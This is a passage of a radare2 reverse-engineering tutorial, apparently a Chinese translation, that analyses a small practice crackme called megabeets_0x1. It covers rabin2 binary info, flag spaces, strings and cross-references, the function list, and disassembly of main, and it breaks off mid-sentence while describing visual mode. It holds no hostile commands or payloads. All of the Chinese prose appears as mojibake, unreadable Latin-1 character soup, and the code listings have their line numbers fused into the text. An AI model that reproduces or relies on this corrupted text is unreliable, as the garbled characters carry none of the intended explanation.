å·²ç»åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸Šä¸‹è½½äº†radare2å’Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹æ¢ç´¢radare2çš„åŸºç¡€ä½¿ç”¨ã€‚æˆ‘ä¼šåœ¨REMunxä¸Šè°ƒè¯•ï¼Œå¤§éƒ¨åˆ†çš„å‘½ä»¤å’Œè¯´æ˜è·ŸWindowsæˆ–è€…å…¶ä»–ç³»ç»Ÿä¸Šæ˜¯ä¸€æ ·çš„ã€‚ å‘½ä»¤è¡Œå‚æ•°å’Œå¤§éƒ¨åˆ†å‘½ä»¤è¡Œå·¥å…·ä¸€æ ·ï¼ŒæŸ¥çœ‹å¯é€‰å‚æ•°çš„æ–¹å¼æ˜¯æ‰§è¡Œ-hå‚æ•°ï¼š 1$ r2 -h æˆ‘ä¸æŠŠå®Œæ•´çš„è¾“å‡ºæ”¾ä¸Šæ¥ï¼Œè€Œæ˜¯æ”¾ä¸€äº›æˆ‘æ—¥å¸¸å·¥ä½œä¸­å¸¸ç”¨çš„å‚æ•°ï¼š 12345678910111213Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file] [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|= -d: Debug the executable 'file' or running process 'pid'-A: Analyze executable at load time (xrefs, etc)-q: Quiet mode, exit after processing commands-w: Write mode enabled-L: List of supported IO plugins-i [file]: Interprets a r2 script-n: Bare load. Do not load executable info as the entrypoint-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')-p [prj]: Creates a project for the file being analyzed-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with äºŒè¿›åˆ¶ä¿¡æ¯é¢å¯¹ä¸€ä¸ªæ–°çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ç¬¬ä¸€ä»¶æƒ³åšçš„äº‹å°±æ˜¯è·å–æ–‡ä»¶çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨r2æ¡†æ¶ä¸­æœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€â€”â€”rabin2æ¥è·å–ä¿¡æ¯ã€‚ rabin2å¯ä»¥ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è·å–ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŒºæ®µã€æ–‡ä»¶å¤´ã€å¯¼å…¥å¯¼å‡ºè¡¨ã€å­—ç¬¦ä¸²ã€å…¥å£ç‚¹ç­‰ç­‰ã€‚åŒæ—¶å…·æœ‰ä¸åŒçš„æ ¼å¼çš„è¾“å‡ºã€‚rabin2æ”¯æŒELFã€PEã€Mach-Oã€Java CLASSç­‰æ–‡ä»¶ã€‚ ä½¿ç”¨man rabin2æŸ¥çœ‹æ›´å¤šçš„ä¿¡æ¯ã€‚ æˆ‘ä»¬æ‰§è¡Œrabin2å¹¶ä½¿ç”¨å‚æ•°-Iè¾“å‡ºäºŒè¿›åˆ¶ä¿¡æ¯ï¼Œä¾‹å¦‚æ“ä½œç³»ç»Ÿã€è¯­è¨€ã€å­—èŠ‚åºã€æ¡†æ¶ä»¥åŠä¿æŠ¤æŠ€æœ¯ï¼ˆæ¯”å¦‚Canaryã€PICã€NXï¼‰ç­‰ç­‰ã€‚ 123456789101112131415161718192021222324252627$ rabin2 -I megabeets_0x1havecode truepic falsecanary falsenx falsecrypto falseva trueintrp /lib/ld-linux.so.2bintype elfclass ELF32lang carch x86bits 32machine Intel 80386os linuxminopsz 1maxopsz 16pcalign 0subsys linuxendian littlestripped falsestatic falselinenum truelsyms truerelocs truerpath NONEbinsz 6220 ä½ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª32ä½elfæ–‡ä»¶ï¼Œæ²¡æœ‰ç¬¦å·è¡¨å¹¶ä¸”æ˜¯åŠ¨æ€é“¾æ¥ã€‚å®ƒæ²¡æœ‰ä»»ä½•æ¼æ´åˆ©ç”¨æŠ€æœ¯â€”â€”ä¸‹ä¸€ç¯‡æ–‡ç« æˆ‘ä»¬è®²å­¦ä¹ ä½¿ç”¨radare2æ¥å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚è®©æˆ‘ä»¬è·‘ä¸€ä¸‹ç¨‹åºï¼Œçœ‹çœ‹å®ƒåšäº†ä»€ä¹ˆã€‚ æ³¨æ„ï¼šè™½ç„¶æˆ‘å¯ä»¥å‘ä½ ä¿è¯è¿™ä¸ªç¨‹åºæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯é€†å‘ä¸€ä¸ªæœªçŸ¥çš„ç¨‹åºæ—¶ï¼ŒåŠ¡å¿…åœ¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒä¸‹è¿è¡Œã€‚ ä¸è¿‡ä½ å¯ä»¥ç›¸ä¿¡æˆ‘ï¼Œå› ä¸ºç¨‹åºç¡®å®æ˜¯å®‰å…¨çš„ã€‚ğŸ˜› 1234567891011$ ./megabeets_0x1 .:: Megabeets ::.Think you can make it?Nop, Wrong argument. $ ./megabeets_0x1 abcdef .:: Megabeets ::.Think you can make it?Nop, Wrong argument. ç¬¬ä¸€æ¬¡è·‘çš„æ—¶å€™ï¼Œè¾“å‡ºäº†Nop, Wrong argumentã€‚å‡è®¾æˆ‘ä»¬éœ€è¦æä¾›ä¸€ä¸ªå‚æ•°ï¼Œç¬¬äºŒæ¬¡è¾“å…¥abcdefä½œä¸ºå‚æ•°ï¼Œä¾æ—§å¤±è´¥äº†ã€‚æ˜¾ç„¶éœ€è¦ç‰¹å®šçš„å­—ç¬¦ä¸²æ‰èƒ½ç»•è¿‡ã€‚ è®©æˆ‘ä»¬ç”¨radare2æ¥æµ‹è¯•ç¨‹åºï¼š 123$ r2 ./megabeets_0x1 â€” Thank you for using radare2. Have a nice night![0x08048370]&gt; æˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ªradare2çš„shellï¼Œè¿˜æœ‰ä¸€ä¸ªæ¬¢è¿ç•Œé¢ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œfoæ¥è¾“å‡ºä¸€ä¸ªæ–°çš„å¥å­ï¼Œæœ‰äº›å¾ˆæç¬‘åŒæ—¶æœ‰äº›ä¹Ÿå¾ˆæœ‰è¶£ã€‚ç°åœ¨r2çš„shellæ­£åœ¨ç­‰ç€æˆ‘ä»¬è¾“å…¥å‘½ä»¤ï¼Œå¹¶ä¸”å±•ç¤ºç»™æˆ‘ä»¬æ­¤åˆ»æ‰€åœ¨çš„åœ°å€ï¼ˆ0x08048370ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬è‡ªåŠ¨åœ¨å…¥å£ç‚¹å¤„ã€‚è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æ­£ç¡®ï¼š 123[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints æˆ‘ä»¬ä½¿ç”¨ieå‘½ä»¤è¾“å‡ºäº†æ–‡ä»¶çš„å…¥å£ç‚¹åœ°å€ã€‚r2å‘½ä»¤æœ‰ä¸€ç³»åˆ—æœ‰æ„ä¹‰çš„å­—æ¯ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œieä»£è¡¨äº†info &gt;&gt; entrypointã€‚å› æ­¤åœ¨ä½ ç†Ÿæ‚‰äº†radare2çš„èƒ½åŠ›ä¹‹åï¼Œå‘½ä»¤éƒ½æ˜¯æ¯”è¾ƒå¥½è®°çš„ã€‚ä½†æ˜¯ä½ ä¸éœ€è¦è®°ä½æ‰€æœ‰çš„å‘½ä»¤â€”â€”ä½ å¯ä»¥ä»…ä»…éœ€è¦åœ¨ï¼ˆå‡ ä¹ï¼‰æ¯ä¸ªå­—æ¯åé¢åŠ ä¸Š?æ¥è·å¾—å‘½ä»¤çš„ä¿¡æ¯ä»¥åŠå®ƒçš„å­å‘½ä»¤ã€‚ 12345678910111213141516171819202122232425262728293031323334[0x08048370]&gt; i?|Usage: i Get info from opened file (see rabin2â€™s manpage)| Output mode:| â€˜*â€™ Output in radare commands| â€˜jâ€™ Output in json| â€˜qâ€™ Simple quiet output| Actions:| i|ij Show info of current file (in JSON)| iA List archs| ia Show all info (imports, exports, sections..)| ib Reload the current buffer for setting of the bin (use once only)| ic List classes, methods and fields| iC Show signature info (entitlements, â€¦)| id Debug information (source lines)| iD lang sym demangle symbolname for given language| ie Entrypoint| iE Exports (global symbols)| ih Headers (alias for iH)| iHH Verbose Headers in raw text| ii Imports| iI Binary info| ik [query] Key-value database from RBinObject| il Libraries| iL List all RBin plugins loaded| im Show info about predefined memory allocation| iM Show main address| io [file] Load info from file (or last opened) use bin.baddr| ir|iR Relocs| is Symbols| iS [entropy,sha1] Sections (choose which hash algorithm to use)| iV Display file version info| iz Strings in data sections| izz Search for Strings in the whole binary| iZ Guess size of binary program iå‘½ä»¤ç›®çš„æ˜¯ä»æ‰“å¼€çš„æ–‡ä»¶ä¸­è·å–ä¿¡æ¯ï¼Œå®ƒå°±æ˜¯é›†æˆåˆ°radare2çš„shellé‡Œçš„rabin2ï¼ˆä¹‹å‰æåˆ°çš„ï¼‰ã€‚ åˆ†æé»˜è®¤æƒ…å†µä¸‹radare2ä¸ä¼šè‡ªåŠ¨åˆ†ææ–‡ä»¶ï¼Œå› ä¸ºåˆ†ææ–‡ä»¶æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œå°¤å…¶æ˜¯æ¯”è¾ƒå¤§çš„æ–‡ä»¶ã€‚äº†è§£æ›´å¤šå…³äºåˆ†æçš„å†…å®¹ï¼Œä½ å¯ä»¥çœ‹ä¸€çœ‹åœ¨radare2åšå®¢ä¸Šçš„è¿™ç¯‡æ–‡ç« ã€‚ æ˜¾ç„¶åˆ†æä»ç„¶æ˜¯å¯èƒ½çš„ï¼Œr2æä¾›äº†è®¸å¤šç§ç±»çš„åˆ†ææ–¹å¼ã€‚æ­£å¦‚æˆ‘ä¹‹å‰æåˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹aå‘½ä»¤åé¢æ·»åŠ ?æ¥æŸ¥æ‰¾åˆ†æé€‰é¡¹ã€‚ 1234567891011121314151617181920212223242526[0x08048370]&gt; a?|Usage: a[abdefFghoprxstc] [â€¦]| ab [hexpairs] analyze bytes| abb [len] analyze N basic blocks in [len] (section.size by default)| aa[?] analyze all (fcns + bbs) (aa0 to avoid sub renaming)| ac[?] [cycles] analyze which op could be executed in [cycles]| ad[?] analyze data trampoline (wip)| ad [from] [to] analyze data pointers to (from-to)| ae[?] [expr] analyze opcode eval expression (see ao)| af[?] analyze Functions| aF same as above, but using anal.depth=1| ag[?] [options] output Graphviz code| ah[?] analysis hints (force opcode size, â€¦)| ai [addr] address information (show perms, stack, heap, â€¦)| ao[?] [len] analyze Opcodes (or emulate it)| aO Analyze N instructions in M bytes| ar[?] like â€˜drâ€™ but for the esil vm. (registers)| ap find prelude for current offset| ax[?] manage refs/xrefs (see also afx?)| as[?] [num] analyze syscall using dbg.reg| at[?] [.] analyze execution tracesExamples:f ts @ S*~text:0[3]; f t @ section..textf ds @ S*~data:0[3]; f d @ section..data.ad t t+ts @ d:ds æˆ‘é€šå¸¸å¼€å§‹åˆ†ææ—¶ä¼šæ‰§è¡Œaaï¼ˆanalyse allï¼‰ã€‚è¿™ä¸ªåç§°æœ‰ä¸€ç‚¹å®¹æ˜“è¯¯è§£ï¼Œå› ä¸ºé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šå¯ä»¥åˆ†æçš„ï¼ˆæ‰§è¡Œaa?å¯ä»¥çœ‹åˆ°æ›´å¤šçš„ç”¨æ³•ï¼‰ï¼Œä½†å¯¹äºè¿™ä¸ªç¨‹åºæ¥è¯´å·²ç»è¶³å¤Ÿäº†ã€‚è¿™æ¬¡æˆ‘ä»¬ç›´æ¥æ‰§è¡Œaaaï¼Œæ›´ç®€å•äº›ã€‚ä½ ä¹Ÿå¯ä»¥æ‰§è¡Œradare2ç”¨-Aå‚æ•°æ¥åˆ†ææ–‡ä»¶ï¼Œç›´æ¥åœ¨å¼€å§‹å°±æ‰§è¡Œaaaï¼ˆä¾‹å¦‚r2 -A megabeets_0x1ï¼‰ 123456[0x08048370]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan) æ ‡å¿—åœ¨åˆ†æä¹‹åï¼Œradare2æŠŠä¸€äº›ç‰¹å®šçš„åå­—å’Œåç§»è”ç³»åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚åŒºæ®µã€å‡½æ•°ã€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²ç­‰ç­‰ã€‚ä»–ä»¬è¢«ç§°ä½œä¸ºæ ‡å¿—ã€‚æ ‡å¿—è¢«æ•´åˆè¿›æ ‡å¿—ç©ºé—´ï¼Œä¸€ä¸ªæ ‡å¿—ç©ºé—´æ˜¯æ‰€æœ‰ç±»ä¼¼ç‰¹å¾çš„æ ‡å¿—çš„é›†åˆã€‚æ‰§è¡Œfsä»¥æŸ¥çœ‹æ‰€æœ‰çš„æ ‡å¿—ï¼š 1234567[0x08048370]&gt; fs0 4 . strings1 35 . symbols2 82 . sections3 5 . relocs4 5 . imports5 1 . functions æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fs &lt;flagspace&gt;æ¥æŸ¥çœ‹æŸä¸ªç‰¹å®šçš„æ ‡å¿—ç©ºé—´ï¼Œç„¶åç”¨fè¾“å‡ºæ‰€æœ‰çš„æ ‡å¿—ã€‚æˆ‘ä»¬ä½¿ç”¨åˆ†å·å°†ä¸€è¡Œä¸­çš„å¤šä¸ªå‘½ä»¤åˆ†å¼€ï¼ˆæ¯”å¦‚å‘½ä»¤ä¸€; å‘½ä»¤äºŒ; å‘½ä»¤ä¸‰;...ï¼‰ã€‚ 123456[0x08048370]&gt; fs imports; f0x08048320 6 sym.imp.strcmp0x08048330 6 sym.imp.strcpy0x08048340 6 sym.imp.puts0xffffffff 16 loc.imp.__gmon_start__0x08048350 6 sym.imp.__libc_start_main æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œradare2å°†æ‰€æœ‰ç¨‹åºæ‰€ä½¿ç”¨çš„å¯¼å…¥è¡¨è¾“å‡ºâ€”â€”å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„strcmpã€strcpyã€putsç­‰ï¼ŒåŒ…æ‹¬ç›¸å…³çš„åœ°å€ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ—å‡ºå­—ç¬¦ä¸²çš„æ ‡å¿—ç©ºé—´ã€‚ 12345[0x08048370]&gt; fs strings; f0x08048700 21 str._n__.::_Megabeets_::.0x08048715 23 str.Think_you_can_make_it_0x0804872c 10 str.Success__n0x08048736 22 str.Nop__Wrong_argument._n å­—ç¬¦ä¸²æˆ‘ä»¬çœ‹åˆ°r2åˆ—å‡ºäº†ä¸€äº›å­—ç¬¦ä¸²çš„åç§»ï¼Œè¿˜æœ‰ä¸€äº›å˜é‡åã€‚è®©æˆ‘ä»¬ä¸»è¦æ¥çœ‹çœ‹å­—ç¬¦ä¸²ã€‚æœ‰å¾ˆå¤šå¯ä»¥åˆ—å‡ºç¨‹åºä¸­å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½ å¯ä»¥é€‰æ‹©ä½ æœ€éœ€è¦çš„ä¸€ç§ã€‚iz â€“ åˆ—å‡ºåœ¨æ•°æ®çŸ­çš„å­—ç¬¦ä¸²izz â€“ åœ¨æ•´ä¸ªç¨‹åºä¸­æŸ¥æ‰¾å­—ç¬¦ä¸² 12345[0x08048370]&gt; izvaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\\n .:: Megabeets ::.vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\\nvaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\\n æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†å¤§éƒ¨åˆ†å­—ç¬¦ä¸²â€”â€”è¿˜è®°å¾—æˆ‘ä»¬ä¸€å¼€å§‹è¿è¡Œç¨‹åºæ—¶çš„é‚£å‡ è¡Œå­—ç¬¦ä¸²å§ã€‚ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰çœ‹åˆ°Successï¼Œè¿™åº”è¯¥æ˜¯æˆ‘ä»¬è¾“å…¥æ­£ç¡®å­—ç¬¦ä¸²åçš„æç¤ºã€‚æ—¢ç„¶æˆ‘ä»¬å·²ç»å¾—åˆ°äº†å­—ç¬¦ä¸²ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å®ƒä»¬åœ¨ç¨‹åºçš„ä»€ä¹ˆåœ°æ–¹è¢«ä½¿ç”¨äº†ã€‚ 12345[0x08048370]&gt; axt @@ str.*data 0x8048609 push str._n__.::_Megabeets_::. in maindata 0x8048619 push str.Think_you_can_make_it_ in maindata 0x8048646 push str._n_tSuccess__n in maindata 0x8048658 push str._n_tNop__Wrong_argument._n in main è¿™ä¸ªå‘½ä»¤å±•ç¤ºç»™æˆ‘ä»¬radare2æ›´å¤šçš„ç‰¹ç‚¹ã€‚axtå‘½ä»¤ç”¨æ¥åœ¨æ•°æ®æ®µæˆ–ç¨‹åºæ®µäº¤å‰æŸ¥æ‰¾æŸä¸ªåœ°å€ï¼ˆè¯•è¯•ax?ï¼‰ã€‚@@æ˜¯ä¸€ä¸ªè¿­ä»£å™¨æ ‡å¿—ï¼Œç”¨æ¥åœ¨ä¸€æ®µåç§»ä¸Šé‡å¤æŸä¸ªå‘½ä»¤ï¼ˆè¯•è¯•@@?ï¼‰ã€‚str.*æ˜¯ä¸€ä¸ªå¯¹æ‰€æœ‰å¼€å¤´ä¸ºstr.çš„æ ‡å¿—çš„é€šé…ã€‚è¿™æ¡å‘½ä»¤èƒ½å¸®åŠ©æˆ‘åˆ—å‡ºå­—ç¬¦ä¸²æ ‡å¿—ä»¥åŠå¯¹åº”æ‰€åœ¨çš„å‡½æ•°åã€‚åœ¨è¿™ä¹‹å‰è¦ç¡®ä¿é€‰æ‹©äº†å­—ç¬¦ä¸²çš„æ ‡å¿—ç©ºé—´ï¼ˆé»˜è®¤æ—¶æ˜¯fs *ï¼‰ã€‚ å®šä½æ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä¹‹å‰æˆ‘ä»¬ä¸€ç›´åœ¨ç¨‹åºçš„å…¥å£ç‚¹ï¼Œç°åœ¨åº”è¯¥å»å…¶ä»–åœ°æ–¹çœ‹çœ‹äº†ã€‚æˆ‘ä»¬åˆšåˆ—å‡ºæ¥çš„å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨mainå‡½æ•°ä¸­çš„ã€‚ä¸ºäº†å®šä½åˆ°å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨seekå‘½ä»¤ï¼Œç”¨sæ›¿ä»£ã€‚æ­£å¦‚å¤§å®¶æ‰€çŸ¥é“çš„ï¼Œåœ¨ï¼ˆå‡ ä¹ï¼‰æ¯ä¸ªå‘½ä»¤ååŠ ä¸Š?ä¼šè§£å†³ä½ æ‰€æœ‰çš„é—®é¢˜ã€‚ 123456789101112131415161718192021222324[0x08048370]&gt; s?|Usage: s # Seek commands| s Print current address| s addr Seek to address| s- Undo seek| s- n Seek n bytes backward| sâ€“ Seek blocksize bytes backward| s+ Redo seek| s+ n Seek n bytes forward| s++ Seek blocksize bytes forward| s[j*=] List undo seek history (JSON, =list, *r2)| s/ DATA Search for next occurrence of â€˜DATAâ€™| s/x 9091 Search for next occurrence of \\x90\\x91| s.hexoff Seek honoring a base from core-&gt;offset| sa [[+-]a] [asz] Seek asz (or bsize) aligned to addr| sb Seek aligned to bb start| sC[?] string Seek to comment matching given string| sf Seek to next function (f-&gt;addr+f-&gt;size)| sf function Seek to address of specified function| sg/sG Seek begin (sg) or end (sG) of section or file| sl[?] [+-]line Seek to line| sn/sp Seek next/prev scr.nkey| so [N] Seek to N next opcode(s)| sr pc Seek to register seekå‘½ä»¤æ˜¯æ¥æ”¶ä¸€ä¸ªåœ°å€æˆ–æ˜¯ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥æ˜¯æ•°å­¦è¿ç®—ã€æ ‡å¿—æˆ–è€…å†…å­˜è®¿é—®æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œs mainæ¥å®šä½åˆ°mainå‡½æ•°ã€‚è®©æˆ‘ä»¬å…ˆé€šè¿‡aflå‘½ä»¤ï¼ˆAnalyze Functions Listï¼‰æ¥æŸ¥çœ‹radare2ä¸ºæˆ‘ä»¬åˆ—å‡ºäº†å“ªäº›å‡½æ•°ã€‚ 12345678910111213141516171819[0x08048370]&gt; afl0x080482ec 3 35 sym._init0x08048320 1 6 sym.imp.strcmp0x08048330 1 6 sym.imp.strcpy0x08048340 1 6 sym.imp.puts0x08048350 1 6 sym.imp.__libc_start_main0x08048360 1 6 sub.__gmon_start___252_3600x08048370 1 33 entry00x080483a0 1 4 sym.__x86.get_pc_thunk.bx0x080483b0 4 43 sym.deregister_tm_clones0x080483e0 4 53 sym.register_tm_clones0x08048420 3 30 sym.__do_global_dtors_aux0x08048440 4 43 -&gt; 40 sym.frame_dummy0x0804846b 19 282 sym.rot130x08048585 1 112 sym.beet0x080485f5 5 127 main0x08048680 4 93 sym.__libc_csu_init0x080486e0 1 2 sym.__libc_csu_fini0x080486e4 1 20 sym._fini è¿™äº›å¯¼å…¥å‡½æ•°æ­£æ˜¯æˆ‘ä»¬ä¹‹å‰æ‰€çœ‹åˆ°çš„ï¼ŒåŒ…æ‹¬å…¥å£ç‚¹ã€libcã€mainå‡½æ•°å’Œä¸¤ä¸ªå¼•äººæ³¨æ„çš„å‡½æ•°åˆ†åˆ«å«åšsym.beetå’Œsym.rot13ã€‚ åæ±‡ç¼–mainå‡½æ•°æ˜¯æ—¶å€™å»çœ‹çœ‹æ±‡ç¼–ä»£ç äº†ã€‚é¦–å…ˆæˆ‘ä»¬ç”¨s mainæ¥å®šä½åˆ°mainå‡½æ•°ï¼Œç„¶åç”¨pdfå‘½ä»¤ï¼ˆPrint Disassemble Functionï¼‰æ¥åæ±‡ç¼–ã€‚æ³¨æ„åœ°å€æ˜¯æ€ä¹ˆå‡†ç¡®åœ°å˜æˆmainå‡½æ•°çš„åœ°å€çš„ã€‚ æ³¨æ„ï¼šæ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œè¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯æ•™å¤§å®¶å­¦ä¹ å’Œäº†è§£radare2ï¼Œè€Œä¸æ˜¯æ•™æ±‡ç¼–è¯­è¨€çš„ã€‚å› æ­¤æˆ‘ä¸ä¼šå½»åº•åœ°è§£é‡Šä»£ç ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªç¨‹åºä¹Ÿå¾ˆç®€å•ï¼Œä½ åªè¦æœ‰ä¸€ç‚¹ç‚¹åŸºç¡€çš„é€†å‘å·¥ç¨‹çŸ¥è¯†å°±èƒ½æŒæ¡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[0x08048370]&gt; s main[0x080485f5]&gt; pdf ;â€“ main:/ (fcn) main 127| main ();| ; var int local_8h @ ebp-0x8| ; var int local_4h @ esp+0x4| ; DATA XREF from 0x08048387 (entry0)| 0x080485f5 8d4c2404 lea ecx, [esp + local_4h] ; 0x4| 0x080485f9 83e4f0 and esp, 0xfffffff0| 0x080485fc ff71fc push dword [ecx â€“ 4]| 0x080485ff 55 push ebp| 0x08048600 89e5 mov ebp, esp| 0x08048602 53 push ebx| 0x08048603 51 push ecx| 0x08048604 89cb mov ebx, ecx| 0x08048606 83ec0c sub esp, 0xc| 0x08048609 6800870408 push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.| 0x0804860e e82dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048613 83c410 add esp, 0x10| 0x08048616 83ec0c sub esp, 0xc| 0x08048619 6815870408 push str.Think_you_can_make_it_ ; â€œThink you can make it?â€ @ 0x8048715| 0x0804861e e81dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048623 83c410 add esp, 0x10| 0x08048626 833b01 cmp dword [ebx], 1 ; [0x1:4]=0x1464c45| ,=&lt; 0x08048629 7e2a jle 0x8048655| | 0x0804862b 8b4304 mov eax, dword [ebx + 4] ; [0x4:4]=0x10101| | 0x0804862e 83c004 add eax, 4| | 0x08048631 8b00 mov eax, dword [eax]| | 0x08048633 83ec0c sub esp, 0xc| | 0x08048636 50 push eax| | 0x08048637 e849ffffff call sym.beet| | 0x0804863c 83c410 add esp, 0x10| | 0x0804863f 85c0 test eax, eax| ,==&lt; 0x08048641 7412 je 0x8048655| || 0x08048643 83ec0c sub esp, 0xc| || 0x08048646 682c870408 push str.Success__n ; â€œSuccess!.â€ @ 0x804872c| || 0x0804864b e8f0fcffff call sym.imp.puts ; int puts(const char *s)| || 0x08048650 83c410 add esp, 0x10| ,===&lt; 0x08048653 eb10 jmp 0x8048665| ||| ; JMP XREF from 0x08048629 (main)| ||| ; JMP XREF from 0x08048641 (main)| |-&gt; 0x08048655 83ec0c sub esp, 0xc| | 0x08048658 6836870408 push str.Nop__Wrong_argument._n ; â€œNop, Wrong argument..â€ @ 0x8048736| | 0x0804865d e8defcffff call sym.imp.puts ; int puts(const char *s)| | 0x08048662 83c410 add esp, 0x10| | ; JMP XREF from 0x08048653 (main)| `â€”&gt; 0x08048665 b800000000 mov eax, 0| 0x0804866a 8d65f8 lea esp, [ebp â€“ local_8h]| 0x0804866d 59 pop ecx| 0x0804866e 5b pop ebx| 0x0804866f 5d pop ebp| 0x08048670 8d61fc lea esp, [ecx â€“ 4]\\ 0x08048673 c3 ret çœ‹è¿‡æ±‡ç¼–ä»£ç åï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€æ®µç®€å•çš„ä¼ªä»£ç ï¼š 12345678910111213if (argc &gt; 1 &amp;&amp; beet(argv[1]) == true) # i.e - if any argument passed to the program AND the result of beet, given the passed argument, is true# argc is the number of arguments passed to the program# argc will be at least 1 becuase the first argument is the program name# argv is the array of parameters passed to the program&#123; print \"success\"&#125;else&#123; print \"fail\"&#125; exit å¯è§†åŒ–æ¨¡å¼å’Œå›¾å½¢æ¨¡å¼radare2æœ‰ç€ä¸€ä¸ªéå¸¸å¼ºå¤§ã€æ•ˆç‡æé«˜çš„å¯è§†åŒ–æ¨¡å¼ã€‚å¯è§†åŒ–æ¨¡å¼å¯¹ç”¨æˆ·éå¸¸å‹å¥½å¹¶ä¸”å°†ä½¿ç”¨r2çš„é€†å‘è¿‡ç¨‹å¸¦åˆ°äº†ä¸€ä¸ªæ–°çš„é«˜åº¦ã€‚æŒ‰ä¸‹Vé”®å¼€å¯å¯è§†åŒ–æ¨¡å¼ã€‚æŒ‰ä¸‹p/Pé”®ç”¨æ¥åˆ‡æ¢æ¨¡å¼ã€‚åœ¨å±å¹•çš„æœ€ä¸Šæ–¹å¯ä»¥çœ‹åˆ°ä½ è¾“å…¥çš„å‘½ä»¤ã€‚è¿™é‡ŒæŒ‰på¯ä»¥åˆ‡æ¢å›åŸæ¥çš„åæ±‡ç¼–æ¨¡å¼ã€‚ å¯è§†åŒ–æ¨¡å¼åŸºæœ¬å‘½ä»¤ç§»åŠ¨ä½ å¯ä»¥é€šè¿‡kå‘ä¸Šç§»åŠ¨ï¼Œé€šè¿‡jå‘ä¸‹ç§»åŠ¨ã€‚å›è½¦é”®å¯ä»¥jmpæˆ–è€…callåˆ°ç›®æ ‡åœ°å€ã€‚åŒæ—¶åœ¨æ¯ä¸ªjmpæˆ–callå³ä¾§æ³¨é‡Šçš„æ–¹æ‹¬å·ä¸­æœ‰æ•°å­—ï¼Œç›´æ¥æŒ‰ç›¸åº”çš„æ•°å­—å¯è·³è½¬åˆ°å¯¹åº”åœ°å€ã€‚ å¸®åŠ©æ­£å¦‚ä¹‹å‰å‘½ä»¤è¡Œä¸‹çš„radare2ï¼ŒæŒ‰ä¸‹?å¯ä»¥ä¸ºä½ å±•ç°å¸®åŠ©çª—å£ï¼Œä½ å¯ä»¥å­¦ä¹ å¯è§†åŒ–æ¨¡å¼ä¸‹çš„å„ä¸ªå‘½ä»¤ã€‚ äº¤å‰å¼•ç”¨ç”¨x/Xåˆ†åˆ«æ¥åˆ—å‡ºå½“å‰å‡½æ•°çš„å¼•ç”¨å’Œè°ƒç”¨çš„æƒ…å†µã€‚æŒ‰ä¸‹å¯¹åº”æ•°å­—æ¥è·³è½¬ã€‚ radare2å‘½ä»¤ä½¿ç”¨ï¼šåœ¨å¯è§†åŒ–æ¨¡å¼ä¸‹è¾“å…¥:commandæ¥æ‰§è¡Œr2å‘½ä»¤ æ³¨é‡Šä½ å¯ä»¥é€šè¿‡;[-]commentæ¥æ·»åŠ æˆ–åˆ 